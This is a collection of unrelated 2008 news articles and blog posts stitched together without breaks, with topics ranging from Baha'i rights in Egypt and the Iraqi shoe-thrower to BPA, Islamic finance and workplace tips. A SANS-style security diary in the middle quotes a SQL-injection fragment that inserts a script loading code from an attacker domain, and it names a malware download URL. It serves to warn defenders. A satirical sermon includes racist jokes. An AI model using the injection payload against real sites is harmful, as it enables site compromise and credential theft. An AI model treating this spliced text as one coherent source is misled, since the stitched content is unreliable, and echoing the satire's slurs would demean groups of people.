“ But after the decree , ” said Dr. Basma Moussa , a leading Egyptian Baha ’i blogger and Assistant Professor in oral surgery at Cairo University , “ if you did n’t write Muslim , Christian or Jew , you could not be born , go to school , buy a car , open a bank account , apply for a job , get married , or even die . ”
The small and now stateless Egyptian Baha ’i community — estimated at around 2,000 members — protested .
In January 2008 , the Court of Administrative Justice ordered the Ministry of Interior ’s Civil Status Department ( CSD ) in two separate cases to place a dash in the field for religious affiliation on identification documents of Baha ’i citizens .
Unfortunately , the victory was a hollow one , and — almost one year later — the CSD has refused to implement the rulings though no appeals have been issued by the Ministry of Interior to challenge them .
“ It ’s all for show , ” said 22 - year - old Asmaa Winkelbach , an Egyptian Baha ’i studying at the Higher Institute for Arabic Music .
“ The decisions take place for [ international political shows ] and are not applied . ”
Some Baha ’i were even more forceful in their criticism of the government .
“ They want to shut us up , ” added Dr. Moussa .
“ To tell us : see , we gave you what you wanted ! ”
The Baha ’i religion was founded by Bahá ’u 'lláh in nineteenth - century Persia and is founded on a threefold unity : God is one , the prophets are one and humanity is one .
There are an estimated five to six million Baha ’is around the world in more than 200 countries .
Bahai’s have lived in Egypt — the first Muslim country to recognize the Baha ’i faith in 1924 — for over 100 years .
In the 1960s , however , President Nasser shut down the Baha ’i national assembly , confisticated Baha ’i properties and banned all Baha ’i institutions .
Last week , on the birthday of Bahá ’u ' lláh ’ ( born November 12th 1817 ) , the third ruling on the right of Baha ’is to place a dash in the religious affiliation field was granted to Egyptian student Hady Hassan Ali .
Ali faces expulsion from the Faculty of Agriculture in Alexandria since without an identification card he could n’t defer his military conscription .
55 - year - old American Baha ’i Frank Bradley , an associate professor and theatre director at the American University in Cairo who has been living in Egypt for the past nine years , said that even if the ruling is n’t implemented , it ’s a step in the right direction .
“ Before the recent court cases came to public attention , very few people in Egypt knew about the Baha ’i faith , ” he said .
“ Now it ’s much more widely known , and I consider this a good thing . ”
But even a good thing can result in criticism .
The 34 - minute documentary film about Baha ’is in Egypt ( clip below ) titled Identity Crisis : My Religion or my Country ( which features both bloggers Samir and Moussa ) showcases several negative Egyptians ’ reactions towards Baha ’is .
In the film , which is produced by independent filmmaker Ahmed Ezzat , one man said they should endure “ death or crucifixion or amputation of the limbs or exile ” and another declared “ death to the infidels . ”
The Baha ’i Faith has its roots in the Babi religion , which emerged from Shi’i Islam in Iran in the mid nineteenth century .
However , one of the Faith ’s central tenets is that Islam is not the final revelation of God .
Does the apparent distaste for the Baha ’i religion stem from the fact that it is considered an aberration of Islam ?
“ Tension occurs because we are Egyptians and not because we are Baha ’i , ” said Samir , whose blog gets an average of 200 visitors a day , 60 % from Egypt .
“ Egyptians are big on conformity — even Christians face difficulties .
Though I think the similarities between the religions should increase familiarity . ”
The situation , however , said Dr. Moussa — whose blog has had over 130,000 unique visitors — has changed since the documentary was filmed in late 2006 .
“ The first time I spoke in a conference in 2006 representing Baha ’is , it was as if I ’d just announced I was unknown species , ” she said .
“ Now , awareness has increased greatly , and there are a lot of Egyptians and groups supporting our cause . ”
Egyptians for Baha’i and Minority rights is a facebook group that emerged in support of minority rights .
The online forum states that Egyptians “ are morally obligated by being here at this point in time to stand united against the hate and terror inflicted on Egyptian Baha ’i s and all religious minorities in Egypt . ”
The group was founded by 27 - year - old Cynthia Farahat , program officer at the Network of Arab Liberals .
An Egyptian , she said she created the group with the aim of raising awareness of the Baha ’i Faith when she saw death threats on television made towards its followers .
“ Egyptians are hostile [ towards Baha'is ] as a result of being indoctrinated by the state and Al Azhar that Baha ’is are infidels that have no place in their own land , ” she said .
“ People being dragged to medieval religious courts for their beliefs is not a sign of development but rather a disturbing alarm of falling into dark ages .
[ Egyptians ] are victims of their media and intolerant religious clergy . ”
The Muslim Network for Baha ’i Rights is another group supporting Baha ’is , and is made up of Arab and Iranian Muslim students and interfaith social activists .
Launched in summer 2007 , the website is continually updated and monitors the conditions of Egyptian and Iranian Baha ’is in their struggle for civil rights .
“ As practicing Muslims we do n’t believe in the Baha ’i faith , ” wrote Esraa Al Shafei , founder of the website , in an online post .
“ But why should that stand in the way of granting them their full rights ?
Why should our religious differences justify decades of abuse , wrongful imprisonment , murder , denial of education , and other crimes ? ”
And that is where the crux of the matter lies : civil rights vs. religious rights .
Samir said that most Egyptians actually have no problem saying that Baha ’is should have civil rights , though accepting the religion as legitimate is still far - off .
“ But we ’re not asking that the religion be recognized , ” said Dr. Moussa , “ just that we be given our rights as citizens .
Until then , our lives are on hold . ”
Perhaps Egyptians need to take a leaf out of Bahá ’u ' lláh ’s book , who said :
“ Religion should be the cause of love and unity .
You are all the branches of one tree and the leaves of one branch . ”
BAGHDAD ( Reuters ) - The Iraqi journalist who threw his shoes at U.S. President George W. Bush has become the talk of Iraq , hailed by marchers as a national hero but blasted by the government as a barbarian .
The little - known Shi’ite reporter , said to have harbored anger against Bush for the thousands of Iraqis who died after the 2003 U.S. - led invasion , had previously made headlines only once , when he was briefly kidnapped by gunmen in 2007 .
TV reporter Muntazer al - Zaidi remained in detention on Monday , accused by the Iraqi government of a “ barbaric act . ”
He would be sent for trial on charges of insulting the Iraqi state , said the prime minister ’s media adviser , Yasin Majeed .
His employer , independent al - Baghdadiya television , demanded his release and demonstrators rallied for him in Baghdad ’s Sadr City , in the southern Shi’ite stronghold of Basra and in the holy city of Najaf , where some threw shoes at a U.S. convoy .
“ Thanks be to God , Muntazer ’s act fills Iraqi hearts with pride , ” his brother , Udai al - Zaidi , told Reuters Television .
“ I ’m sure many Iraqis want to do what Muntazer did .
Muntazer used to say all the orphans whose fathers were killed are because of Bush . ”
Zaidi shouted “ this is a goodbye kiss from the Iraqi people , dog , ” at Bush in a news conference he held with Prime Minister Nuri al - Maliki during a farewell visit to Baghdad on Sunday .
The journalist then flung one shoe at Bush , forcing him to duck , followed by another , which sailed over Bush ’s head and slammed into the wall behind him .
Throwing shoes at someone is the worst possible insult in the Arab world .
Zaidi was dragged struggling and screaming from the room by security guards and could be heard shouting outside while the news conference continued after momentary mayhem .
‘ BARBARIC ’
The government said Zaidi had carried out “ a barbaric and ignominious act ” that was not fitting of the media ’s role and demanded an apology from his television station .
Al - Baghdadiya television played endless patriotic music , with Zaidi ’s face plastered across the screen .
A newscaster solemnly read out a statement calling for his release , “ in accordance with the democratic era and the freedom of expression that Iraqis were promised by U.S. authorities . ”
Slideshow ( 7 images )
It said that any harsh measures taken against the reporter would be reminders of the “ dictatorial era . ”
The Iraqi Journalists ’ Syndicate said Zaidi’s “ far from professional ” and irresponsible conduct had placed it in an “ embarrassing and critical ” situation .
Nevertheless , it called on Maliki to release him for humanitarian reasons .
“ It was the throw of the century .
I believe Bush deserves what happened to him because he has not kept his promises to Iraqis , ” said Baghdad resident Abu Hussein , 48 .
Slideshow ( 7 images )
Parliamentary reaction was mixed , with some saying Zaidi chose the wrong venue for his protest .
Others cheered .
“ Al - Zaidi ’s shoe is the most famous shoe in the whole world , ” said Fawzi Akram , a Turkman lawmaker loyal to anti-American Shi’ite cleric Moqtada al - Sadr .
A Libyan charity group chaired by leader Muammar Gaddafi ’s daughter , Aicha Gaddafi , gave Zaidi an award for bravery .
Zaidi , now in his late 20s , spent more than two days blindfolded , after armed men kidnapped him in November 2007 .
He said at the time that the kidnappers had beaten him until he lost consciousness , and used his necktie to blindfold him .
He never learned the identity of the kidnappers , who questioned him about his work but did not demand a ransom .
Colleagues say Zaidi resented Bush , blaming him for the bloodshed that ravaged Iraq .
It did not appear that he had lost any close family members during the sectarian killings and insurgency , which in recent months have finally begun to wane .
Federal and state lawmakers said Monday they would work to ban bisphenol A from food and beverage containers after a Journal Sentinel analysis found that even plastic products billed as " microwave safe " released toxic doses of the chemical when heated .
Rep. Edward J. Markey ( D - Mass . ) said he will re-introduce a bill in Congress in January to ban BPA from food and beverage containers , citing the newspaper 's analysis .
" This test of ' microwave safe ' containers adds to the already vast and compelling body of knowledge indicating that BPA is dangerous and unsuitable for all food and beverage containers , " Markey said .
The newspaper reported Sunday that all 10 products it had tested leached toxic doses of the chemical when heated .
The newspaper measured the amounts of the chemical released after heating , and it used this information to calculate how much BPA children of various ages and weights would consume if they were to eat from the products .
The Journal Sentinel then searched for studies in which scientists had looked at these levels of BPA exposure in live laboratory animals .
It found 17 studies that showed harm at these levels - harm that included genital defects , behavioral changes and abnormal development of mammary glands .
The changes to the mammary glands were identical to those observed in women at higher risk for breast cancer .
Sen. Charles Schumer ( D - N.Y. ) said he , too , would renew his fight to have BPA removed from all children 's products after reading the newspaper 's analysis .
" Parents always err on the side of caution when it comes to their kids ' health .
We think that the law should do the same , " Schumer said .
In addition to Congress , 13 states have proposed bans on BPA .
Wisconsin is not one of them .
But State Sen. Julie Lassa ( D - Stevens Point ) said Monday that she is preparing legislation to ban BPA from children 's products in Wisconsin .
Lassa , chairman of the state Senate 's Committee on Economic Development , said she became concerned about the chemical last spring after learning that Canada was banning the chemical in baby bottles and children 's products .
" It 's scary stuff , " said Lassa , who has children ages 4 and 17 months .
She said she buys food packaged in plastic for her children .
" It 's so convenient , " she said .
But the more she has learned , the more concerned she is .
" I 'm horrified , " she said .
" The more chemicals we use , the more we are finding out how they impact the human body . "
BPA , used to make baby bottles and the lining of metal food cans , including those containing infant formula , is tied to reproductive failures , breast cancer risk , diabetes and heart disease .
A study last month found that it interferes with chemotherapy for breast cancer patients .
Lassa said she is consulting with Canadian lawmakers to see how they fashioned their ban .
" The biggest question is how to enforce this , " she said .
Earlier this year , the Food and Drug Administration declared BPA to be safe .
But it reopened its examination after a subcommittee of an advisory board found that the agency had ignored valuable studies .
Markey held up the Journal Sentinel results to bolster his criticism of the FDA .
" Without strong , definitive action by the FDA , people across the country are left to wonder whether the foods and beverages they consume are tainted by BPA leaching from the containers , potentially causing serious long - term health problems , " he said .
" This is unacceptable . "
There is no official test to declare a product " microwave safe . "
Companies are free to label their packages as they see fit , regardless of whether the package leaches BPA when heated .

Few have been spared the satire of Matt Groening 's long running animated sitcom .
Last night , The Simpsons took on Apple , or uh , Mapple for a full 6 minutes of lampoonery -- a pretty harsh ride at a two - joke per minute pace .
It all starts when the Springfield mall gets its very own Mapple store , " it 's so sterile , " gasps Lisa upon entering .

Yes , we reporters might get stuck covering the late shift or -- egad ! -- a parade .
When disaster strikes or a source calls back on deadline , the nights can be long .
Newspaper layoffs and hard economic times can cast a pall over just about everything we do .
But those concerns seem a piffle every time I read dispatches from around the world about journalists who , fighting for the story , also must fight for their lives .
The day before Christmas , an international group condemned the protracted torture of a journalist in Pakistan .
And militant Maoists ransacked the offices of an opposition newspaper in Nepal .
Its crime ?
Using acronyms for two of the militant groups without distinguishing between them .
A couple of days later , news arrived that Zimbabwean journalist and human rights activist Jestina Mukoko had been accused of plotting to overthrow the government .
Mukoko -- already in custody for challenging Robert Mugabe , the thug who runs her country -- could face death .

Sadly , real press freedom remains elusive even closer to home , as revealed by another story just over our southern border .
Two days before Christmas , a 15 - year - old Mexican boy held a news conference in El Paso to detail how his reporter father had been held -- without charges -- for six months .
The perpetrators were not shadowy foreign agents or some sketchy dictator , but the United States government and its immigration service .
The story grows out of the drug violence that has beset Mexico and left more than 5,300 people dead this year .
Since 2000 , 44 journalists have been killed in Mexico , many of them targeted for writing about the drug gangs that dominate the country .
The military crackdown on the drug lords has created its own problems .
And that ’s what brought reporter Emilio Gutierrez Soto of El Diario del Noroeste into the story .
Advertisement
In 2005 , he wrote that some soldiers were drunk when they raided a hotel in northern Chihuahua state .
Other stories reported alleged thievery by the military .
Last spring , a squad of soldiers and their commanding officer invited Gutierrez to a restaurant in his hometown of Ascension .
They told him he would pay with his life if he continued .
They ordered him not to tell anyone about the meeting .
Gutierrez , 46 , promptly wrote another story , in which he recounted the alleged death threat .
A few nights later , he said , a pounding on the door awoke him and his son .
Some 50 soldiers , wearing masks , ripped through the house , claiming they were looking for drugs and illegal weapons , he said .
The soldiers did n’t find anything and left , Gutierrez said .
After , a friend of one of the soldiers warned him that the next visit would be the last .
Advertisement
Gutierrez , the sole supporter of his son , decided he could not wait .
On June 15 , the reporter and his boy crossed the Rio Grande and into the land of the 1st Amendment , turning themselves in to immigration officials and pleading for asylum .
Immigration and Customs Enforcement officials took father and son into custody and sent them to a detention center in El Paso .
The U.S. has rejected asylum requests from several other Mexican journalists who said they feared for their safety .
But Gutierrez said he believed he could prove he had a real and credible fear for his personal safety in his home country .
The bitter irony -- according to his lawyer , Carlos Spector -- is that by presenting himself as an “ arriving alien , ” the reporter was not entitled to the judicial hearing that an illegal crosser would have received .
Advertisement
ICE ’s request to postpone his hearing until March means that Gutierrez will have waited nine months to plead his case .
So he sits and waits , missing his freedom and his son ( who was released to family friends in the U.S. after a couple of months in custody ) .
He wonders how he can make a new start , if he gets the chance .
“ I am not a criminal , ” the reporter said in a telephone interview last week .
“ I am a journalist . ”
U.S. officials , Spector said , have called Gutierrez a “ threat to the community ” but offered no evidence .
“ They ca n’t even come up with a rationale , ” Spector said .
“ They do n’t even try . ”
Advertisement
An ICE spokeswoman declined to comment , citing Gutierrez ’s privacy and the pending hearing .
Spector theorizes that the U.S. government is loath to offer relief to a journalist who has raised doubts about the Mexican military ’s conduct .
That would embarrass an ally and trading partner .
Even if he could be released back to Mexico , Gutierrez said , he would not want to go , fearful about his safety and of leaving his son behind .
“ I love my country , but I ca n’t go , ” he said .
“ Because if I do , I ’m going to die . ”
Another El Diario reporter was shot to death last month outside his home in Ciudad Juarez , across the border from El Paso .
An online newspaper editor at the funeral received a cellphone call : “ You will be next . ”
Advertisement
Reporters Without Borders , an international nonprofit that advocates for journalists , has spearheaded attempts to win Gutierrez ’s release .
The Catholic bishop of El Paso last week lent his voice to the campaign .
It would be nice to believe our government is trying only to protect us .
But it ’s hard to imagine what ’s taking so long to decide Gutierrez ’s fate -- or what would warrant holding a reporter for so long , without the chance to plead for his freedom .
In the meantime , the U.S. government has pledged that it wants to help Mexico win its war on drugs and corruption .
A good way to start would be to protect the journalists who have risked their lives to help the public understand a sad , sad state of affairs .

BBC religious affairs correspondent
In the midst of turmoil in the global financial system , there is one branch of finance that aims to operate within strict moral and ethical boundaries - Islamic finance .
But how will it survive in the current climate ?
Some say Sharia - based finance will better weather the storm Opposite London 's largest mosque , in the heart of the capital 's Muslim community , is a branch of the Islamic Bank of Britain .
It is one of eight branches around the UK that bring Islamic finance to the high street .
It looks just like any other high street bank  but manager Abul Fozoll tells me that it offers finance with a difference .
 Every single product we offer here is all Sharia compliant .
From home purchase plans to direct savings , these are all governed by Sharia principles .
That means there 's no mention of interest  instead , savers are offered a projected share of profits .
In practice , Muslims can still get a return on their investment , but without compromising their religious principles .
High street Islamic finance is just one small part of a thriving industry .
[ Islamic finance ] has a method to show to the world that things can be done in a different way which is more ethically sound and more financially sound too
Mufti Mohammed Zubair Butt , chairman of panel of sharia scholars
In London 's Canary Wharf , I attended a conference of financiers assessing the prospects for Islamic finance .
Talk of the credit crunch was never far away , but some delegates believe the ethical principles that underpin Sharia - based finance mean it will better weather the current financial storm .
Mufti Mohammed Zubair Butt is chairman of the UK's first panel of sharia scholars , who rule on whether particular products or services meet strict Islamic criteria .
He is optimistic about the sector 's future :  It has an alternative to present .
It has a method to show to the world that things can be done in a different way which is more ethically sound and more financially sound too .
One expert on Islamic finance , Durham University professor Rodney Wilson , points out that no Islamic financial institution has yet failed in the current crisis .
He contrasts excessive risk - taking  in the mainstream financial sector with a fairly classical banking model still followed by Islamic institutions .
Regulation
But there are challenges facing Islamic finance .
One key concern is the lack of regulatory framework within the sector , meaning that Sharia scholars are free to differ over what constitutes Sharia - compliance .
It can lead to inconsistency when it comes to rulings about what sort of investments are appropriate .
Andy Critchlow , middle east managing editor for Dow Jones , warned that Sharia boards consulted by financial institutions may not always be as independent as they appear .
 Companies appoint their own Sharia compliancy boards .
Companies pay those Sharia compliancy boards to actually structure the Sharia compliant agreement for them ,  he says .
 The industry in many respects is a house without foundation in that it does n't have the foundation of regulation underpinning it .
Of course , the value of regulation is currently hotly contested throughout the financial industry , but proponents of Islamic finance believe that its in - built adherence to Islamic law means it offers a fairer , more ethical financial system .
What no one can predict is the extent to which Islamic finance 's principles will mean it is better shielded from the current financial storms .
Some fear that it is already so entwined with mainstream finance that its future is as risky as any other part of the global financial industry .

What are these ?
Friends in Christ , Do You Have Demons in Your Colon ?
Pastor Deacon Fred Preaching
Folks , here at Landover Baptist Church , we do n't care about secular opinions , we do n't care about polls , we do n't care what 's in the newspaper and we sure as hell do n't give a damn what some fancy atheistic scientist says .
All we care about is what God says .
If them scientists would have been paying attention to the Bible , they would have found out a long time ago what Christians already knew for the last 2,000 years .
What 's that ?
Why , it 's the fact that Hell is bubbling and brewing right under our feet .
Hell is in the center of the earth .
If you do n't believe it , then read your Bible !
God tells us in Revelation , chapter 14 , that he is going to torment people with fire and brimstone .
Friends ?
Do you know what brimstone is ?
It 's sulfur , that 's what it is .
Do you know where sulfur is ?
It 's in the center of the earth , that 's where it is .
And it is Satan ’s little calling card .
When you smell sulfur , you know Satan has been around .
I ca n’t tell you how many times I ’ve had saved men come up to me who work on them oil drilling platforms in that Gulf of Mexicans and tell me the same story .
They say that sometimes they drill too far and suddenly the whole platform fills with the smell of sulfur coming up the pipeline straight from Hell .
Sometimes , they can actually hear the sounds of demons in Hell screaming for mercy coming up the pipe .
It is a fact the media do n’t want you to know , but the folks at Exxon Mobile have had to start playing loud rap music on their platforms just to drown out the sounds of demons scampering up the pipeline to escape their never - ending torture .
Sometimes , they do n’t close the hole quick enough and millions of demons escape .
Fortunately for us , most of these demons that escape find themselves in the water ( and drown because the New Testament teaches that demons , like black people , ca n’t swim ) or they turn up in some godforsaken Arab country where everyone is damned anyway so they ca n’t do much harm .
p>
But when you smell sulfur , you know the Devil is around .
Friends , have you ever sat yourself down on the toilet to do nature ’s necessity and been overwhelmed by the smell of rotten eggs ?
It is sulfur .
A clear sign that demons are living in your bottom .
You need to get yourself down to a Bible - believing church , pronto , and get yourself a Jesus enema !
The scientists just found that out a few years ago .
God 's people knew it all along .
If those idiots would stop letting the Devil do all the thinking for them and turn to God 's word , they 'd find what they 're looking for .
Salvation .
Freedom from Satan 's distractions .
Distractions like books , universities , science , biology , astronomy ...
Why , did you know that there are some scientists out there who are ignorant enough to believe that there is life on other planets ?
They even think that the stars in the sky are little suns , with planets revolving around them .
Well , they got it half right .
The Bible tells us that they are sons , not suns .
They are the sons of Abraham .
Every Bible believing Christian knows this is true .
Their heavenly garments light up the night sky as proof that God 's home is above our heads .
So , we know that Hell is a real place , with a real location .
There is even more evidence of this ( cause that 's what the scientists are asking us for ) when we see volcanic eruptions .
They spit out tons of sulfuric gas into the air .
Betty Bowers will tell you that global warming is a direct result of overpopulation in Hell .
I will agree with her on this , but I would like to take it a step further .
When you see that volcano erupt over there in Japan , you are seeing the growing pains of Hell .
God is still working on Hell , folks .
Frankly ,
He never guessed there would be so many Asians , and since every one of those sneaky folks is sent to Hell ( do NOT pass Go ) , the place is more packed than one of them rafts from Cuba .
In fact , Hell has gotten so crowded , it has started to annex parts of the surface of the Earth .
So far , all Satan has laid claim to is Africa ( and no one even noticed ! [ laugh ] , but he will eventually start taking over places that matter .
God made the earth in 6 days , but he is still carving out a place in the core of the planet earth where he will torture people forever in a literal lake of fire !
do n't know what else it 's gonna take for folks to be convinced .
Frankly , the thought is so frightening that I can't see why people are not running to their local churches and begging to get saved , and become tithing members .
240,000 people go to Hell every day .
That 's 158 people a minute .
You can line up all the people who went to Hell in the last 10 years and have them all hold hands – if they had n’t been chewed off by demons .
The line would circle the planet eight times .
That 's why it keeps getting bigger .
Jesus tells us that that " broad is the way to destruction , but narrow is the path to salvation . "
The reason we talk about Hell so much in this church is because God talked about it .
Did you know that for every time Heaven is mentioned in the Bible , Hell is mentioned 10 times ?
I wish I could tell you how many people go to Heaven each day .
It 's hard to say .
I can tell you that one went last week , when we lost a dear member of this church .
Rev. Charles Wilson lived all 87 years of his life on this church campus .
He was born here , and he died here .
Praise God !
He was called to serve in one place , and he never faltered from that calling .
He never set foot off of this campus until the day he died .
The only other place that Rev. Charles Wilson ever visited is Heaven .
And that is a Godly testament to this fine church .
He went from Landover to Glory .
In fact , I do n’t even know if that counts as a change .
End of story .
As Christians , we can sit back and laugh at science .
Sometimes , we cry tears of joy as well .
Every time some fancy academic comes up with something he thinks is new , we can turn to our Bibles and see that there is nothing new .
God told King Solomon that " there is nothing new under the sun . "
The Bible is the only book anyone needs to read .
The Devil do n't want you to know that , though .
That 's why he writes books of his own .
He wrote the best selling Harry Potter series just to distract children from reading the Bible .
We see where that went .
Little boys wanting to be fairies , kids killing their parents ( and other unsaved kids in public schools ) . "
Most of this can be traced back to the fact that children can't read the Bible in school .
They can read the smutty works of that panty - hose - wearing William Shakespeare , and the unintelligible drunken ramblings of Muriel Hemingway , but they can't read the Bible .
Children are even being forced to read books written by angry colored folks like Maya Angeloony who write under the influence of demonic voodoo gods .
Why , our little children in public schools are even told to read books written by homosexuals and harlots with pen-names that celebrate smutty incest like Dickinson .
It all comes as no surprise , though .
This is a Devil - run world , and Christians have always been the minority .
Satan would kill us all if he could , but he wants to make God even more mad by trying to convert us back into being unsaved .
Ah yes , we know his battle plan .
This church is not going to be suckered by Hell 's minions .
As long as I live and breathe , I wo n't let it happen .

The fundamentalist difference
December 4 , 2008 by lestro
by lestro
What a lot of creationists do n’t understand is that evolution is not a world view , but is instead simply an explanation , and one that changes when new evidence is discovered .
Unlike the world of creationists , in which an ideological world view is laid out and everything must conform to it .
For example , according to creationist reasoning , there is no special section in the Bible talking about dinosaurs , therefore dinosaurs and man must have existed at the same time , damn the fossil record , carbon dating and whatever other evidence that science might offer .
Nevermind the obvious , that if they existed at the same time , you ’d think it would be mentioned in the fucking Bible , as Bill Hicks said .
In a recent NYT article , this difference is again made clear as recent experiments have completely blown away a long - standing theory of what the beginnings of the planet looked like , forcing scientists to adapt their views based on the new evidence .
You ’ll never see a fundie do that .
Analyses of crystals in rocks in Australia , left , have formed a new picture of the early Earth , depicted with young oceans in the painting at right .
( Left , Bruce Watson ; right , Don Dixon )
Over the last decade , the mineralogical analysis of small hardy crystals known as zircons embedded in old Australian rocks has painted a picture of the Hadean period “ completely inconsistent with this myth we made up , ” Dr. Harrison said .
Geologists now almost universally agree that by 4.2 billion years ago , the Earth was a pretty placid place , with both land and oceans .
Instead of hellishly hot , it may have frozen over .
Because the young
Sun put out 30 percent less energy than it does today , temperatures on Earth might have been cold enough for parts of the surface to have been covered by expanses of ice .
Called the Hadean period because it was thought to resemble the hot , volatile magma - scapes usually identified with the underworld , analysis of the new rocks show the period to be almost exactly the opposite of what the planet was really like at the time .
It also helps explain the beginnings of life better , as the old , volcanic view of the time was not all that conducive to early life forms .
“ The picture that ’s emerging is a watery world with normal rock recycling processes , ” said Stephen J. Mojzsis , a professor of geology at the University of Colorado who was not involved with the U.C.L.A. research .
“ And that ’s a comforting thought for the origin of life . ” [… ]
In the new view of the early Earth , life could have emerged hundreds of millions of years earlier .
“ This means the door is open for a long , slow chemical evolution , ” Dr. Mojzsis said .
“ The stage was set for life probably 4.4 billion years ago , but I do n’t know if the actors were present . ”
While all of this is fascinating , it once again points out the differences in the fundie and scientific arguments .
While scientists can always come up with new theories when new evidence arrives , creationists can’t and can only get more stubborn and more out - of - touch .
Creationists look at the world through a rigid , unchanging world view , therefore any new science or evidence must be massaged and crammed into that world view , no matter how radical and stupid it may be .
Dinosaur bones dating back millions of year ?
Not possible .
Either your methods are flawed or God is testing your faith .
Because all those animals must have existed in the Garden of Eden at the same time and that is that .
Or , or , or – how ’s this – there ’s a designer who made everything exactly as it is and should be .
The appendix ?
We ca n’t comprehend the workings of such an intelligence …
The build up to Iraq was the same way : a rigid world view that all evidence and intelligence – no matter how contradictory – had to fit into .
and that ’s dangerous .
in so many ways .
Britain is shrugging off its prudish image after a study found its citizens to be the most promiscuous of any large western industrial nation , while Australians ranked fifth .
An international index measuring one - night stands , total numbers of partners and attitudes to casual sex also put Britain ahead of second - placed Germany , with the Netherlands third , the Czech Republic fourth and the US sixth .
Researchers behind the study say high scores such as Britain 's may be linked to society 's increasing willingness to accept sexual promiscuity among women as well as men .
UPDATE 2 :
Here are couple of updates regarding the latest 0 - day .
As noted in Microsoft 's advisory , Windows Server 2008 and Vista ( both SP0 and SP1 ) are affected as well .
The exploit for Windows Vista is publicly available now as well , but most malicious web sites still use the exploit I analyzed yesterday , so they are attacking only Windows XP and Windows 2003 machines .
It also appears that more attackers are now using this – we received log files showing that attackers using SQL injection are now .
The SQL Injection attacks are similar to those we 've described multiple times before ( see http://isc.sans.org/diary.html?storyid=4565, for example ) .
The important part includes the target URL that is injected :
…
rtrim ( convert ( varchar ( 4000 ) , ['+@C + ' ] ) ) +''< script src=http://17gamo [ dot ] com/1.js></script >''')
FETCH NEXT FROM
…
This domain is not listed by Shadowserver yet .
The 1.js script on the domain links to multiple other HTML documents of which one is called ie7.htm .
You guessed it , it contains the latest 0 - day exploit for Internet Explorer .
If executed successfully , the script will download the binary from http://www [ dot ] steoo [ dot ] com/admin/win.exe .
This is a game password stealer which has sporadic detection ( http://www.virustotal.com/analisis/244ae03fed5b32d999c50b614fddde6a) – there are some big names still missing it .
In any case , the attackers are picking this quickly so make sure that you are following recommendations from Microsoft 's advisory which will help reduce exposure or , if you can , use an alternative browser until this has been fixed .

Update : Microsoft published a bulletin regarding this issue .
See www.microsoft.com/technet/security/advisory/961051.mspx .
In addition , shadowserver.org published a list of infected sites .
Note that this list may not be complete .
The best mitigating action from the bulletin is probably to enable DEP for Internet Explorer 7 . [ JBU ]
As reported by some other researchers , there is a 0 - day exploit for Internet Explorer circulating in the wild .
At this point in time it does not appear to be wildly used , but as the code is publicly available we can expect that this will happen very soon .
This is a brand new exploit that is * not* patched with MS08 - 073 that was released yesterday .
I can confirm that the exploit works in a fully patched Windows XP machine .
The exploit is a typical heap overflow that appears to be exploiting something in the XML parser .
After setting up the heap ( spraying it – allocating 159 arrays containing the shell code ) the exploit checks if couple of things are satisfied before continuing :
The user has to be running Internet Explorer
The version of Internet Explorer has to be 7
The operating system has to be Windows XP or Windows 2003
If these things are satisfied , the exploit creates an XML tag as shown above .
What is also interesting , and can be seen in the code above is that it waits 6 seconds before executing the code – this was probably added to thwart automatic crawlers by anti-virus vendors .
We have not confirmed yet if other versions are affected ( Internet Explorer 6 or Internet Explorer 7 on Microsoft Windows Vista ) .
How to mitigate ?
This is a difficult question as we have not analyzed this completely yet .
If you use an alternative browser you are not affected .
When we get more information we will update the diary .

WASHINGTON ( Reuters ) - Researchers using closed - circuit televisions to create an illusion have made volunteers virtually swap bodies , even making women believe they were in a man ’s body and vice - versa .
The experiment , reported in the Public Library of Science journal PLoS ONE on Tuesday , shows it is possible to manipulate the human mind to create the perception of having another body , the Swedish researchers said .
It helps explain how humans understand the limits of their own bodies , Valeria Petkova and Henrik Ehrsson of the Karolinska Institute in Stockholm reported .
They set up a series of experiments aimed at fooling their volunteers , each an extension of a common illusion in which people can be fooled into thinking a rubber hand is their own .
For the illusion , the volunteer ’s real hand is concealed and stroked at the same time the visible rubber hand is .
The brain will often trick the volunteer into truly feeling as if the rubber hand is his or her own hand .
Petkova and Ehrsson went further , using a closed - circuit camera to fool their volunteers into believing a rubber mannequin was in fact their own body -- and eventually , that another human being was .
“ This effect is so robust that , while experiencing being in another person ’s body , a participant can face his or her biological body and shake hands with it without breaking the illusion , ” they wrote .
They started with a life - sized mannequin .
“ Two closed - circuit television cameras were positioned on a male mannequin such that each recorded events from the position corresponding to one of the mannequin ’s eyes , ” they wrote .
“ A set of head - mounted displays connected to the cameras was worn by the participants , and connected in such a way that the images from the left and right video cameras were presented on the left and right eye displays , respectively , providing a true stereoscopic image , ” they added .
“ Participants were asked to tilt their heads downwards as if looking down at their bodies .
Thus , the participants saw the mannequin ’s body where they expected to see their own . ”
As in the rubber hand illusion , the experimenters touched the volunteers ’ bodies at the same time as they touched the mannequin .
“ ... it was evident that the participants had felt the mannequin ’s body to be their own body , ” they wrote .
Finally , they tried a full body swap between two volunteers and it worked .
The illusion only goes so far .
The researchers said they could not fool their volunteers into thinking they were a box , for example .

Editor 's note : CNN.com has a business partnership with CareerBuilder.com , which serves as the exclusive provider of job listings and services to CNN.com .
We 've all heard the conventional wisdom about good work habits .
Many of us have attended time management classes , participated in workshops and have been advised to " work smarter , not harder . "
Work habits that might seem less productive will make you more effective , say experts .
Some ideas , however , appear at first glance to be unusual or even counterintuitive .
But for some employees , these habits keep them productive and motivated .
More importantly , these habits help them get the job done .
Here are some surprising work habits that might seem to contradict conventional wisdom , but have helped these workers achieve their goals .
1. Read a book at work
Gail Hernandez , a marketing coordinator in New Hampshire , faced a challenge .
" I had to learn several software programs without attending classes , " she explains .
Her solution was to press the " pause " button on her regular work so she could read the instruction materials at her desk .
" I received some kidding from co-workers , but I am now able to use Illustrator and Dreamweaver , " Hernandez says .
Whether it's a textbook , newspaper or white paper , it 's beneficial to be informed .
Learning and training is always an ongoing process .
2 . Take frequent breaks -- or longer ones
Many workplaces have designated break times , but several experts suggest that employees follow their instincts instead of schedules and unplug for a moment when your mind or body are on overload .
" Humans can only concentrate for 45 minutes at a time , " declares Doris Jeanette , a psychologist with the Center for New Psychology in Philadelphia .
Jeanette suggests that employees work for 50 minutes of the hour and use the other 10 minutes to change focus or shift gears .
Sue Painter , a marketing consultant and president of The Confident Marketer , proposes an even longer break .
When things are hectic , Painter leaves the office .
" I absolutely force myself to leave for at least an hour .
I gain perspective , get refreshed and go back to the office in a much calmer and more effective state of mind , " Painter remarks .
3 . Blow off low - priority tasks
Author and speaker Allan Bacon insists that blowing off work -- the most unimportant work -- can be beneficial .
" See if anyone notices or complains , " Bacon says .
Why ?
In addition to making your " to do " list less cluttered , Bacon believes this tactic gives you more time .
